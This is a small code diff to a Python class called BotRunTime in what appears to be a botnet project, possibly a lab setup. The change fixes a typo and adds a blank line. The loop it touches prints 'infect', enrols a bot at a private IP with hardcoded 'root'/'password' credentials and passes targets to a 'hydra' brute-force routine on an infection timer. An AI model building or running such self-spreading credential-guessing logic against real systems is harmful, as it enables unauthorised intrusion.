@@ -19,7 +19,7 @@ class BotRunTime:
             print('infect')
             botnet.add_bot('10.142.0.3','root','password')
             target = botnet.targets()
-            bostnet.hydra(target)
+            botnet.hydra(target)
             #print(i.host for i in botnet.botnet)
             j=j+1
             await sleep(settings.INFECTION_CYCLE_TIME)
@@ -40,4 +40,5 @@ class BotRunTime:
         finally:
             self.server.stop()
             self.loop.close()
+
 runtime = BotRunTime(asyncio.get_event_loop(),"10.142.0.2")
